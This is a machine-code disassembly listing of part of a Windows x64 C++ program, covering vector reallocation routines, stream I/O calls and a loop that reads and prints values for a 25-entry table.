   140004f10:	5b                   	pop    %rbx
   140004f11:	c3                   	ret
   140004f12:	cc                   	int3
   140004f13:	cc                   	int3
   140004f14:	cc                   	int3
   140004f15:	cc                   	int3
   140004f16:	cc                   	int3
   140004f17:	cc                   	int3
   140004f18:	cc                   	int3
   140004f19:	cc                   	int3
   140004f1a:	cc                   	int3
   140004f1b:	cc                   	int3
   140004f1c:	cc                   	int3
   140004f1d:	cc                   	int3
   140004f1e:	cc                   	int3
   140004f1f:	cc                   	int3
   140004f20:	40 56                	rex push %rsi
   140004f22:	41 54                	push   %r12
   140004f24:	41 55                	push   %r13
   140004f26:	41 56                	push   %r14
   140004f28:	48 83 ec 28          	sub    $0x28,%rsp
   140004f2c:	4c 8b ca             	mov    %rdx,%r9
   140004f2f:	4c 8b f2             	mov    %rdx,%r14
   140004f32:	49 ba ab aa aa aa aa 	movabs $0x2aaaaaaaaaaaaaab,%r10
   140004f39:	aa aa 2a 
   140004f3c:	48 8b f1             	mov    %rcx,%rsi
   140004f3f:	4d 8b e8             	mov    %r8,%r13
   140004f42:	49 8b c2             	mov    %r10,%rax
   140004f45:	4c 8b 01             	mov    (%rcx),%r8
   140004f48:	48 8b 49 08          	mov    0x8(%rcx),%rcx
   140004f4c:	4d 2b c8             	sub    %r8,%r9
   140004f4f:	49 f7 e9             	imul   %r9
   140004f52:	49 2b c8             	sub    %r8,%rcx
   140004f55:	49 b9 aa aa aa aa aa 	movabs $0xaaaaaaaaaaaaaaa,%r9
   140004f5c:	aa aa 0a 
   140004f5f:	4c 8b e2             	mov    %rdx,%r12
   140004f62:	49 c1 fc 02          	sar    $0x2,%r12
   140004f66:	49 8b c4             	mov    %r12,%rax
   140004f69:	48 c1 e8 3f          	shr    $0x3f,%rax
   140004f6d:	4c 03 e0             	add    %rax,%r12
   140004f70:	49 8b c2             	mov    %r10,%rax
   140004f73:	48 f7 e9             	imul   %rcx
   140004f76:	48 c1 fa 02          	sar    $0x2,%rdx
   140004f7a:	48 8b c2             	mov    %rdx,%rax
   140004f7d:	48 c1 e8 3f          	shr    $0x3f,%rax
   140004f81:	48 03 d0             	add    %rax,%rdx
   140004f84:	49 3b d1             	cmp    %r9,%rdx
   140004f87:	0f 84 ee 00 00 00    	je     0x14000507b
   140004f8d:	48 8b 4e 10          	mov    0x10(%rsi),%rcx
   140004f91:	49 8b c2             	mov    %r10,%rax
   140004f94:	49 2b c8             	sub    %r8,%rcx
   140004f97:	48 89 5c 24 50       	mov    %rbx,0x50(%rsp)
   140004f9c:	4c 89 7c 24 20       	mov    %r15,0x20(%rsp)
   140004fa1:	4c 8d 7a 01          	lea    0x1(%rdx),%r15
   140004fa5:	48 f7 e9             	imul   %rcx
   140004fa8:	48 c1 fa 02          	sar    $0x2,%rdx
   140004fac:	48 8b c2             	mov    %rdx,%rax
   140004faf:	48 c1 e8 3f          	shr    $0x3f,%rax
   140004fb3:	48 03 d0             	add    %rax,%rdx
   140004fb6:	49 8b c1             	mov    %r9,%rax
   140004fb9:	48 8b ca             	mov    %rdx,%rcx
   140004fbc:	48 d1 e9             	shr    $1,%rcx
   140004fbf:	48 2b c1             	sub    %rcx,%rax
   140004fc2:	48 3b d0             	cmp    %rax,%rdx
   140004fc5:	76 4d                	jbe    0x140005014
   140004fc7:	49 8b d9             	mov    %r9,%rbx
   140004fca:	48 8d 0c 5b          	lea    (%rbx,%rbx,2),%rcx
   140004fce:	48 89 6c 24 58       	mov    %rbp,0x58(%rsp)
   140004fd3:	48 c1 e1 03          	shl    $0x3,%rcx
   140004fd7:	48 89 7c 24 60       	mov    %rdi,0x60(%rsp)
   140004fdc:	e8 df c2 ff ff       	call   0x1400012c0
   140004fe1:	41 0f 10 45 00       	movups 0x0(%r13),%xmm0
   140004fe6:	4b 8d 0c 64          	lea    (%r12,%r12,2),%rcx
   140004fea:	48 8b f8             	mov    %rax,%rdi
   140004fed:	0f 11 04 c8          	movups %xmm0,(%rax,%rcx,8)
   140004ff1:	48 8d 2c c8          	lea    (%rax,%rcx,8),%rbp
   140004ff5:	48 8b c8             	mov    %rax,%rcx
   140004ff8:	f2 41 0f 10 4d 10    	movsd  0x10(%r13),%xmm1
   140004ffe:	f2 0f 11 4d 10       	movsd  %xmm1,0x10(%rbp)
   140005003:	4c 8b 46 08          	mov    0x8(%rsi),%r8
   140005007:	48 8b 16             	mov    (%rsi),%rdx
   14000500a:	4d 3b f0             	cmp    %r8,%r14
   14000500d:	75 1a                	jne    0x140005029
   14000500f:	4c 2b c2             	sub    %rdx,%r8
   140005012:	eb 2e                	jmp    0x140005042
   140005014:	48 8d 04 11          	lea    (%rcx,%rdx,1),%rax
   140005018:	49 8b df             	mov    %r15,%rbx
   14000501b:	49 3b c7             	cmp    %r15,%rax
   14000501e:	48 0f 43 d8          	cmovae %rax,%rbx
   140005022:	49 3b d9             	cmp    %r9,%rbx
   140005025:	77 5a                	ja     0x140005081
   140005027:	eb a1                	jmp    0x140004fca
   140005029:	4d 8b c6             	mov    %r14,%r8
   14000502c:	4c 2b c2             	sub    %rdx,%r8
   14000502f:	e8 16 46 00 00       	call   0x14000964a
   140005034:	4c 8b 46 08          	mov    0x8(%rsi),%r8
   140005038:	48 8d 4d 18          	lea    0x18(%rbp),%rcx
   14000503c:	4d 2b c6             	sub    %r14,%r8
   14000503f:	49 8b d6             	mov    %r14,%rdx
   140005042:	e8 03 46 00 00       	call   0x14000964a
   140005047:	4c 8b cb             	mov    %rbx,%r9
   14000504a:	4d 8b c7             	mov    %r15,%r8
   14000504d:	48 8b d7             	mov    %rdi,%rdx
   140005050:	48 8b ce             	mov    %rsi,%rcx
   140005053:	e8 38 00 00 00       	call   0x140005090
   140005058:	48 8b 7c 24 60       	mov    0x60(%rsp),%rdi
   14000505d:	48 8b c5             	mov    %rbp,%rax
   140005060:	48 8b 6c 24 58       	mov    0x58(%rsp),%rbp
   140005065:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   14000506a:	4c 8b 7c 24 20       	mov    0x20(%rsp),%r15
   14000506f:	48 83 c4 28          	add    $0x28,%rsp
   140005073:	41 5e                	pop    %r14
   140005075:	41 5d                	pop    %r13
   140005077:	41 5c                	pop    %r12
   140005079:	5e                   	pop    %rsi
   14000507a:	c3                   	ret
   14000507b:	e8 a0 cc ff ff       	call   0x140001d20
   140005080:	cc                   	int3
   140005081:	e8 da cb ff ff       	call   0x140001c60
   140005086:	cc                   	int3
   140005087:	cc                   	int3
   140005088:	cc                   	int3
   140005089:	cc                   	int3
   14000508a:	cc                   	int3
   14000508b:	cc                   	int3
   14000508c:	cc                   	int3
   14000508d:	cc                   	int3
   14000508e:	cc                   	int3
   14000508f:	cc                   	int3
   140005090:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140005095:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   14000509a:	48 89 7c 24 18       	mov    %rdi,0x18(%rsp)
   14000509f:	41 56                	push   %r14
   1400050a1:	48 83 ec 30          	sub    $0x30,%rsp
   1400050a5:	48 8b d9             	mov    %rcx,%rbx
   1400050a8:	49 8b f1             	mov    %r9,%rsi
   1400050ab:	48 8b 09             	mov    (%rcx),%rcx
   1400050ae:	4d 8b f0             	mov    %r8,%r14
   1400050b1:	48 8b fa             	mov    %rdx,%rdi
   1400050b4:	48 85 c9             	test   %rcx,%rcx
   1400050b7:	74 50                	je     0x140005109
   1400050b9:	4c 8b 53 10          	mov    0x10(%rbx),%r10
   1400050bd:	48 b8 ab aa aa aa aa 	movabs $0x2aaaaaaaaaaaaaab,%rax
   1400050c4:	aa aa 2a 
   1400050c7:	4c 2b d1             	sub    %rcx,%r10
   1400050ca:	49 f7 ea             	imul   %r10
   1400050cd:	48 c1 fa 02          	sar    $0x2,%rdx
   1400050d1:	48 8b c2             	mov    %rdx,%rax
   1400050d4:	48 c1 e8 3f          	shr    $0x3f,%rax
   1400050d8:	48 03 d0             	add    %rax,%rdx
   1400050db:	48 8d 14 52          	lea    (%rdx,%rdx,2),%rdx
   1400050df:	48 c1 e2 03          	shl    $0x3,%rdx
   1400050e3:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   1400050ea:	72 18                	jb     0x140005104
   1400050ec:	48 8b 41 f8          	mov    -0x8(%rcx),%rax
   1400050f0:	48 83 c2 27          	add    $0x27,%rdx
   1400050f4:	48 2b c8             	sub    %rax,%rcx
   1400050f7:	48 83 e9 08          	sub    $0x8,%rcx
   1400050fb:	48 83 f9 1f          	cmp    $0x1f,%rcx
   1400050ff:	77 39                	ja     0x14000513a
   140005101:	48 8b c8             	mov    %rax,%rcx
   140005104:	e8 cf 36 00 00       	call   0x1400087d8
   140005109:	48 89 3b             	mov    %rdi,(%rbx)
   14000510c:	4b 8d 04 76          	lea    (%r14,%r14,2),%rax
   140005110:	48 8d 0c c7          	lea    (%rdi,%rax,8),%rcx
   140005114:	48 89 4b 08          	mov    %rcx,0x8(%rbx)
   140005118:	48 8d 04 76          	lea    (%rsi,%rsi,2),%rax
   14000511c:	48 8b 74 24 48       	mov    0x48(%rsp),%rsi
   140005121:	48 8d 0c c7          	lea    (%rdi,%rax,8),%rcx
   140005125:	48 8b 7c 24 50       	mov    0x50(%rsp),%rdi
   14000512a:	48 89 4b 10          	mov    %rcx,0x10(%rbx)
   14000512e:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   140005133:	48 83 c4 30          	add    $0x30,%rsp
   140005137:	41 5e                	pop    %r14
   140005139:	c3                   	ret
   14000513a:	45 33 c9             	xor    %r9d,%r9d
   14000513d:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140005144:	00 00 
   140005146:	45 33 c0             	xor    %r8d,%r8d
   140005149:	33 d2                	xor    %edx,%edx
   14000514b:	33 c9                	xor    %ecx,%ecx
   14000514d:	ff 15 15 53 00 00    	call   *0x5315(%rip)        # 0x14000a468
   140005153:	cc                   	int3
   140005154:	cc                   	int3
   140005155:	cc                   	int3
   140005156:	cc                   	int3
   140005157:	cc                   	int3
   140005158:	cc                   	int3
   140005159:	cc                   	int3
   14000515a:	cc                   	int3
   14000515b:	cc                   	int3
   14000515c:	cc                   	int3
   14000515d:	cc                   	int3
   14000515e:	cc                   	int3
   14000515f:	cc                   	int3
   140005160:	48 8d 05 61 de 00 00 	lea    0xde61(%rip),%rax        # 0x140012fc8
   140005167:	c3                   	ret
   140005168:	cc                   	int3
   140005169:	cc                   	int3
   14000516a:	cc                   	int3
   14000516b:	cc                   	int3
   14000516c:	cc                   	int3
   14000516d:	cc                   	int3
   14000516e:	cc                   	int3
   14000516f:	cc                   	int3
   140005170:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140005175:	48 89 6c 24 18       	mov    %rbp,0x18(%rsp)
   14000517a:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   14000517f:	57                   	push   %rdi
   140005180:	41 56                	push   %r14
   140005182:	41 57                	push   %r15
   140005184:	48 83 ec 50          	sub    $0x50,%rsp
   140005188:	4c 8b 0d 41 de 00 00 	mov    0xde41(%rip),%r9        # 0x140012fd0
   14000518f:	4c 8b 05 32 de 00 00 	mov    0xde32(%rip),%r8        # 0x140012fc8
   140005196:	4d 3b c1             	cmp    %r9,%r8
   140005199:	74 07                	je     0x1400051a2
   14000519b:	4c 89 05 2e de 00 00 	mov    %r8,0xde2e(%rip)        # 0x140012fd0
   1400051a2:	48 8b 0d 2f de 00 00 	mov    0xde2f(%rip),%rcx        # 0x140012fd8
   1400051a9:	49 ba ab aa aa aa aa 	movabs $0x2aaaaaaaaaaaaaab,%r10
   1400051b0:	aa aa 2a 
   1400051b3:	49 2b c8             	sub    %r8,%rcx
   1400051b6:	49 8b c2             	mov    %r10,%rax
   1400051b9:	48 f7 e9             	imul   %rcx
   1400051bc:	48 c1 fa 02          	sar    $0x2,%rdx
   1400051c0:	48 8b ca             	mov    %rdx,%rcx
   1400051c3:	48 c1 e9 3f          	shr    $0x3f,%rcx
   1400051c7:	48 03 d1             	add    %rcx,%rdx
   1400051ca:	48 83 fa 19          	cmp    $0x19,%rdx
   1400051ce:	73 62                	jae    0x140005232
   1400051d0:	4d 3b c1             	cmp    %r9,%r8
   1400051d3:	49 8b c8             	mov    %r8,%rcx
   1400051d6:	49 8b c2             	mov    %r10,%rax
   1400051d9:	49 0f 44 c9          	cmove  %r9,%rcx
   1400051dd:	49 2b c8             	sub    %r8,%rcx
   1400051e0:	48 f7 e9             	imul   %rcx
   1400051e3:	b9 58 02 00 00       	mov    $0x258,%ecx
   1400051e8:	48 8b fa             	mov    %rdx,%rdi
   1400051eb:	48 c1 ff 02          	sar    $0x2,%rdi
   1400051ef:	48 8b c7             	mov    %rdi,%rax
   1400051f2:	48 c1 e8 3f          	shr    $0x3f,%rax
   1400051f6:	48 03 f8             	add    %rax,%rdi
   1400051f9:	e8 9e 35 00 00       	call   0x14000879c
   1400051fe:	4c 8b 05 cb dd 00 00 	mov    0xddcb(%rip),%r8        # 0x140012fd0
   140005205:	48 8b c8             	mov    %rax,%rcx
   140005208:	48 8b 15 b9 dd 00 00 	mov    0xddb9(%rip),%rdx        # 0x140012fc8
   14000520f:	48 8b d8             	mov    %rax,%rbx
   140005212:	4c 2b c2             	sub    %rdx,%r8
   140005215:	e8 30 44 00 00       	call   0x14000964a
   14000521a:	41 b9 19 00 00 00    	mov    $0x19,%r9d
   140005220:	48 8d 0d a1 dd 00 00 	lea    0xdda1(%rip),%rcx        # 0x140012fc8
   140005227:	4c 8b c7             	mov    %rdi,%r8
   14000522a:	48 8b d3             	mov    %rbx,%rdx
   14000522d:	e8 5e fe ff ff       	call   0x140005090
   140005232:	48 8d 0d f7 61 00 00 	lea    0x61f7(%rip),%rcx        # 0x14000b430
   140005239:	e8 82 fc ff ff       	call   0x140004ec0
   14000523e:	45 33 f6             	xor    %r14d,%r14d
   140005241:	4c 8d 3d 38 d6 00 00 	lea    0xd638(%rip),%r15        # 0x140012880
   140005248:	41 8b ee             	mov    %r14d,%ebp
   14000524b:	41 8b de             	mov    %r14d,%ebx
   14000524e:	66 90                	xchg   %ax,%ax
   140005250:	4a 8b 3c 3b          	mov    (%rbx,%r15,1),%rdi
   140005254:	0f 57 c0             	xorps  %xmm0,%xmm0
   140005257:	4a 8b 74 3b 08       	mov    0x8(%rbx,%r15,1),%rsi
   14000525c:	33 c0                	xor    %eax,%eax
   14000525e:	4a 8b 4c 3b 10       	mov    0x10(%rbx,%r15,1),%rcx
   140005263:	0f 11 44 24 30       	movups %xmm0,0x30(%rsp)
   140005268:	48 89 7c 24 30       	mov    %rdi,0x30(%rsp)
   14000526d:	48 89 74 24 38       	mov    %rsi,0x38(%rsp)
   140005272:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   140005277:	e8 a4 f9 ff ff       	call   0x140004c20
   14000527c:	48 85 c0             	test   %rax,%rax
   14000527f:	74 48                	je     0x1400052c9
   140005281:	4a 63 4c 3b 18       	movslq 0x18(%rbx,%r15,1),%rcx
   140005286:	48 8d 54 24 70       	lea    0x70(%rsp),%rdx
   14000528b:	48 03 c8             	add    %rax,%rcx
   14000528e:	44 89 74 24 70       	mov    %r14d,0x70(%rsp)
   140005293:	41 b8 04 00 00 00    	mov    $0x4,%r8d
   140005299:	e8 d2 f3 ff ff       	call   0x140004670
   14000529e:	4a 8b 44 3b 10       	mov    0x10(%rbx,%r15,1),%rax
   1400052a3:	48 8d 0d b6 61 00 00 	lea    0x61b6(%rip),%rcx        # 0x14000b460
   1400052aa:	44 8b 4c 24 70       	mov    0x70(%rsp),%r9d
   1400052af:	48 ff c5             	inc    %rbp
   1400052b2:	4c 8b c6             	mov    %rsi,%r8
   1400052b5:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1400052ba:	48 8b d7             	mov    %rdi,%rdx
   1400052bd:	44 89 4c 24 40       	mov    %r9d,0x40(%rsp)
   1400052c2:	e8 f9 fb ff ff       	call   0x140004ec0
   1400052c7:	eb 1f                	jmp    0x1400052e8
   1400052c9:	4e 8b 4c 3b 10       	mov    0x10(%rbx,%r15,1),%r9
   1400052ce:	48 8d 0d b3 61 00 00 	lea    0x61b3(%rip),%rcx        # 0x14000b488
   1400052d5:	4c 8b c6             	mov    %rsi,%r8
   1400052d8:	c7 44 24 40 ff ff ff 	movl   $0xffffffff,0x40(%rsp)
   1400052df:	ff 
   1400052e0:	48 8b d7             	mov    %rdi,%rdx
   1400052e3:	e8 d8 fb ff ff       	call   0x140004ec0
   1400052e8:	48 8b 15 e1 dc 00 00 	mov    0xdce1(%rip),%rdx        # 0x140012fd0
   1400052ef:	48 3b 15 e2 dc 00 00 	cmp    0xdce2(%rip),%rdx        # 0x140012fd8
   1400052f6:	74 1d                	je     0x140005315
   1400052f8:	0f 10 44 24 30       	movups 0x30(%rsp),%xmm0
   1400052fd:	f2 0f 10 4c 24 40    	movsd  0x40(%rsp),%xmm1
   140005303:	0f 11 02             	movups %xmm0,(%rdx)
   140005306:	f2 0f 11 4a 10       	movsd  %xmm1,0x10(%rdx)
   14000530b:	48 83 05 bd dc 00 00 	addq   $0x18,0xdcbd(%rip)        # 0x140012fd0
   140005312:	18 
   140005313:	eb 11                	jmp    0x140005326
   140005315:	4c 8d 44 24 30       	lea    0x30(%rsp),%r8
   14000531a:	48 8d 0d a7 dc 00 00 	lea    0xdca7(%rip),%rcx        # 0x140012fc8
   140005321:	e8 fa fb ff ff       	call   0x140004f20
   140005326:	48 83 c3 20          	add    $0x20,%rbx
   14000532a:	48 81 fb 20 03 00 00 	cmp    $0x320,%rbx
   140005331:	0f 82 19 ff ff ff    	jb     0x140005250
   140005337:	41 b8 19 00 00 00    	mov    $0x19,%r8d
   14000533d:	48 8d 0d 6c 61 00 00 	lea    0x616c(%rip),%rcx        # 0x14000b4b0
   140005344:	48 8b d5             	mov    %rbp,%rdx
   140005347:	4c 8d 5c 24 50       	lea    0x50(%rsp),%r11
   14000534c:	49 8b 5b 28          	mov    0x28(%r11),%rbx
   140005350:	49 8b 6b 30          	mov    0x30(%r11),%rbp
   140005354:	49 8b 73 38          	mov    0x38(%r11),%rsi
   140005358:	49 8b e3             	mov    %r11,%rsp
   14000535b:	41 5f                	pop    %r15
   14000535d:	41 5e                	pop    %r14
   14000535f:	5f                   	pop    %rdi
   140005360:	e9 5b fb ff ff       	jmp    0x140004ec0
   140005365:	cc                   	int3
   140005366:	cc                   	int3
   140005367:	cc                   	int3
   140005368:	cc                   	int3
   140005369:	cc                   	int3
   14000536a:	cc                   	int3
   14000536b:	cc                   	int3
   14000536c:	cc                   	int3
   14000536d:	cc                   	int3
   14000536e:	cc                   	int3
   14000536f:	cc                   	int3
   140005370:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   140005375:	53                   	push   %rbx
   140005376:	56                   	push   %rsi
   140005377:	57                   	push   %rdi
   140005378:	41 54                	push   %r12
   14000537a:	41 55                	push   %r13
   14000537c:	41 56                	push   %r14
   14000537e:	41 57                	push   %r15
   140005380:	48 81 ec 90 00 00 00 	sub    $0x90,%rsp
   140005387:	4c 8b fa             	mov    %rdx,%r15
   14000538a:	4c 8b e1             	mov    %rcx,%r12
   14000538d:	48 89 4c 24 48       	mov    %rcx,0x48(%rsp)
   140005392:	48 8b 01             	mov    (%rcx),%rax
   140005395:	48 63 48 04          	movslq 0x4(%rax),%rcx
   140005399:	49 03 cc             	add    %r12,%rcx
   14000539c:	ff 15 66 4f 00 00    	call   *0x4f66(%rip)        # 0x14000a308
   1400053a2:	48 85 c0             	test   %rax,%rax
   1400053a5:	74 0b                	je     0x1400053b2
   1400053a7:	4c 8b 00             	mov    (%rax),%r8
   1400053aa:	48 8b c8             	mov    %rax,%rcx
   1400053ad:	41 ff 50 08          	call   *0x8(%r8)
   1400053b1:	90                   	nop
   1400053b2:	49 8b 04 24          	mov    (%r12),%rax
   1400053b6:	48 63 48 04          	movslq 0x4(%rax),%rcx
   1400053ba:	49 03 cc             	add    %r12,%rcx
   1400053bd:	ff 15 2d 4f 00 00    	call   *0x4f2d(%rip)        # 0x14000a2f0
   1400053c3:	84 c0                	test   %al,%al
   1400053c5:	75 06                	jne    0x1400053cd
   1400053c7:	88 44 24 50          	mov    %al,0x50(%rsp)
   1400053cb:	eb 42                	jmp    0x14000540f
   1400053cd:	49 8b 04 24          	mov    (%r12),%rax
   1400053d1:	48 63 48 04          	movslq 0x4(%rax),%rcx
   1400053d5:	49 03 cc             	add    %r12,%rcx
   1400053d8:	ff 15 c2 4e 00 00    	call   *0x4ec2(%rip)        # 0x14000a2a0
   1400053de:	48 85 c0             	test   %rax,%rax
   1400053e1:	74 25                	je     0x140005408
   1400053e3:	49 3b c4             	cmp    %r12,%rax
   1400053e6:	74 20                	je     0x140005408
   1400053e8:	48 8b c8             	mov    %rax,%rcx
   1400053eb:	ff 15 f7 4c 00 00    	call   *0x4cf7(%rip)        # 0x14000a0e8
   1400053f1:	49 8b 04 24          	mov    (%r12),%rax
   1400053f5:	48 63 48 04          	movslq 0x4(%rax),%rcx
   1400053f9:	49 03 cc             	add    %r12,%rcx
   1400053fc:	ff 15 ee 4e 00 00    	call   *0x4eee(%rip)        # 0x14000a2f0
   140005402:	88 44 24 50          	mov    %al,0x50(%rsp)
   140005406:	eb 07                	jmp    0x14000540f
   140005408:	c6 44 24 50 01       	movb   $0x1,0x50(%rsp)
   14000540d:	b0 01                	mov    $0x1,%al
   14000540f:	84 c0                	test   %al,%al
   140005411:	0f 84 e2 01 00 00    	je     0x1400055f9
   140005417:	49 8b 04 24          	mov    (%r12),%rax
   14000541b:	48 63 48 04          	movslq 0x4(%rax),%rcx
   14000541f:	49 03 cc             	add    %r12,%rcx
   140005422:	48 8d 54 24 70       	lea    0x70(%rsp),%rdx
   140005427:	ff 15 1b 4d 00 00    	call   *0x4d1b(%rip)        # 0x14000a148
   14000542d:	48 8b f0             	mov    %rax,%rsi
   140005430:	33 d2                	xor    %edx,%edx
   140005432:	48 8d 8c 24 e8 00 00 	lea    0xe8(%rsp),%rcx
   140005439:	00 
   14000543a:	ff 15 c0 4c 00 00    	call   *0x4cc0(%rip)        # 0x14000a100
   140005440:	90                   	nop
   140005441:	48 8b 0d 98 db 00 00 	mov    0xdb98(%rip),%rcx        # 0x140012fe0
   140005448:	48 89 4c 24 40       	mov    %rcx,0x40(%rsp)
   14000544d:	48 8b 1d 44 4e 00 00 	mov    0x4e44(%rip),%rbx        # 0x14000a298
   140005454:	48 83 3b 00          	cmpq   $0x0,(%rbx)
   140005458:	75 3a                	jne    0x140005494
   14000545a:	33 d2                	xor    %edx,%edx
   14000545c:	48 8d 8c 24 e0 00 00 	lea    0xe0(%rsp),%rcx
   140005463:	00 
   140005464:	ff 15 96 4c 00 00    	call   *0x4c96(%rip)        # 0x14000a100
   14000546a:	48 83 3b 00          	cmpq   $0x0,(%rbx)
   14000546e:	75 16                	jne    0x140005486
   140005470:	48 8b 05 11 4e 00 00 	mov    0x4e11(%rip),%rax        # 0x14000a288
   140005477:	ff 00                	incl   (%rax)
   140005479:	48 8b 05 08 4e 00 00 	mov    0x4e08(%rip),%rax        # 0x14000a288
   140005480:	48 63 08             	movslq (%rax),%rcx
   140005483:	48 89 0b             	mov    %rcx,(%rbx)
   140005486:	48 8d 8c 24 e0 00 00 	lea    0xe0(%rsp),%rcx
   14000548d:	00 
   14000548e:	ff 15 74 4c 00 00    	call   *0x4c74(%rip)        # 0x14000a108
   140005494:	48 8b 3b             	mov    (%rbx),%rdi
   140005497:	48 8b 4e 08          	mov    0x8(%rsi),%rcx
   14000549b:	48 8d 1c fd 00 00 00 	lea    0x0(,%rdi,8),%rbx
   1400054a2:	00 
   1400054a3:	48 3b 79 18          	cmp    0x18(%rcx),%rdi
   1400054a7:	73 0f                	jae    0x1400054b8
   1400054a9:	48 8b 41 10          	mov    0x10(%rcx),%rax
   1400054ad:	4c 8b 2c 03          	mov    (%rbx,%rax,1),%r13
   1400054b1:	4d 85 ed             	test   %r13,%r13
   1400054b4:	75 6f                	jne    0x140005525
   1400054b6:	eb 03                	jmp    0x1400054bb
   1400054b8:	45 33 ed             	xor    %r13d,%r13d
   1400054bb:	80 79 24 00          	cmpb   $0x0,0x24(%rcx)
   1400054bf:	74 13                	je     0x1400054d4
   1400054c1:	e8 8b 32 00 00       	call   0x140008751
   1400054c6:	48 3b 78 18          	cmp    0x18(%rax),%rdi
   1400054ca:	73 0d                	jae    0x1400054d9
   1400054cc:	48 8b 40 10          	mov    0x10(%rax),%rax
   1400054d0:	4c 8b 2c 03          	mov    (%rbx,%rax,1),%r13
   1400054d4:	4d 85 ed             	test   %r13,%r13
   1400054d7:	75 4c                	jne    0x140005525
   1400054d9:	4c 8b 6c 24 40       	mov    0x40(%rsp),%r13
   1400054de:	4d 85 ed             	test   %r13,%r13
   1400054e1:	75 42                	jne    0x140005525
   1400054e3:	48 8b d6             	mov    %rsi,%rdx
   1400054e6:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   1400054eb:	ff 15 4f 4d 00 00    	call   *0x4d4f(%rip)        # 0x14000a240
   1400054f1:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   1400054f5:	0f 84 4a 01 00 00    	je     0x140005645
   1400054fb:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   140005500:	48 89 9c 24 e0 00 00 	mov    %rbx,0xe0(%rsp)
   140005507:	00 
   140005508:	48 8b cb             	mov    %rbx,%rcx
   14000550b:	e8 04 32 00 00       	call   0x140008714
   140005510:	48 8b 03             	mov    (%rbx),%rax
   140005513:	48 8b cb             	mov    %rbx,%rcx
   140005516:	ff 50 08             	call   *0x8(%rax)
   140005519:	4c 8b 6c 24 40       	mov    0x40(%rsp),%r13
   14000551e:	4c 89 2d bb da 00 00 	mov    %r13,0xdabb(%rip)        # 0x140012fe0
   140005525:	48 8d 8c 24 e8 00 00 	lea    0xe8(%rsp),%rcx
   14000552c:	00 
   14000552d:	ff 15 d5 4b 00 00    	call   *0x4bd5(%rip)        # 0x14000a108
   140005533:	90                   	nop
   140005534:	48 8b 4c 24 78       	mov    0x78(%rsp),%rcx
   140005539:	48 85 c9             	test   %rcx,%rcx
   14000553c:	74 1d                	je     0x14000555b
   14000553e:	48 8b 01             	mov    (%rcx),%rax
   140005541:	ff 50 10             	call   *0x10(%rax)
   140005544:	48 85 c0             	test   %rax,%rax
   140005547:	74 12                	je     0x14000555b
   140005549:	48 8b 08             	mov    (%rax),%rcx
   14000554c:	4c 8b 01             	mov    (%rcx),%r8
   14000554f:	ba 01 00 00 00       	mov    $0x1,%edx
   140005554:	48 8b c8             	mov    %rax,%rcx
   140005557:	41 ff d0             	call   *%r8
   14000555a:	90                   	nop
   14000555b:	49 8b 77 10          	mov    0x10(%r15),%rsi
   14000555f:	4d 8b 77 08          	mov    0x8(%r15),%r14
   140005563:	4d 8b 3f             	mov    (%r15),%r15
   140005566:	49 8b 04 24          	mov    (%r12),%rax
   14000556a:	48 63 48 04          	movslq 0x4(%rax),%rcx
   14000556e:	49 03 cc             	add    %r12,%rcx
   140005571:	ff 15 41 4d 00 00    	call   *0x4d41(%rip)        # 0x14000a2b8
   140005577:	0f b6 f8             	movzbl %al,%edi
   14000557a:	49 8b 0c 24          	mov    (%r12),%rcx
   14000557e:	48 63 59 04          	movslq 0x4(%rcx),%rbx
   140005582:	49 03 dc             	add    %r12,%rbx
   140005585:	48 8b cb             	mov    %rbx,%rcx
   140005588:	ff 15 7a 4d 00 00    	call   *0x4d7a(%rip)        # 0x14000a308
   14000558e:	c6 44 24 60 00       	movb   $0x0,0x60(%rsp)
   140005593:	48 89 44 24 68       	mov    %rax,0x68(%rsp)
   140005598:	0f 28 44 24 60       	movaps 0x60(%rsp),%xmm0
   14000559d:	66 0f 7f 44 24 60    	movdqa %xmm0,0x60(%rsp)
   1400055a3:	48 89 74 24 38       	mov    %rsi,0x38(%rsp)
   1400055a8:	4c 89 74 24 30       	mov    %r14,0x30(%rsp)
   1400055ad:	4c 89 7c 24 28       	mov    %r15,0x28(%rsp)
   1400055b2:	40 88 7c 24 20       	mov    %dil,0x20(%rsp)
   1400055b7:	4c 8b cb             	mov    %rbx,%r9
   1400055ba:	4c 8d 44 24 60       	lea    0x60(%rsp),%r8
   1400055bf:	48 8d 94 24 80 00 00 	lea    0x80(%rsp),%rdx
   1400055c6:	00 
   1400055c7:	49 8b cd             	mov    %r13,%rcx
   1400055ca:	ff 15 68 4c 00 00    	call   *0x4c68(%rip)        # 0x14000a238
   1400055d0:	80 38 00             	cmpb   $0x0,(%rax)
   1400055d3:	74 1a                	je     0x1400055ef
   1400055d5:	49 8b 04 24          	mov    (%r12),%rax
   1400055d9:	48 63 48 04          	movslq 0x4(%rax),%rcx
   1400055dd:	49 03 cc             	add    %r12,%rcx
   1400055e0:	45 33 c0             	xor    %r8d,%r8d
   1400055e3:	ba 04 00 00 00       	mov    $0x4,%edx
   1400055e8:	ff 15 ba 4c 00 00    	call   *0x4cba(%rip)        # 0x14000a2a8
   1400055ee:	90                   	nop
   1400055ef:	eb 08                	jmp    0x1400055f9
   1400055f1:	4c 8b a4 24 d0 00 00 	mov    0xd0(%rsp),%r12
   1400055f8:	00 
   1400055f9:	e8 01 31 00 00       	call   0x1400086ff
   1400055fe:	84 c0                	test   %al,%al
   140005600:	75 0a                	jne    0x14000560c
   140005602:	49 8b cc             	mov    %r12,%rcx
   140005605:	ff 15 bd 4c 00 00    	call   *0x4cbd(%rip)        # 0x14000a2c8
   14000560b:	90                   	nop
   14000560c:	49 8b 04 24          	mov    (%r12),%rax
   140005610:	48 63 48 04          	movslq 0x4(%rax),%rcx
   140005614:	49 03 cc             	add    %r12,%rcx
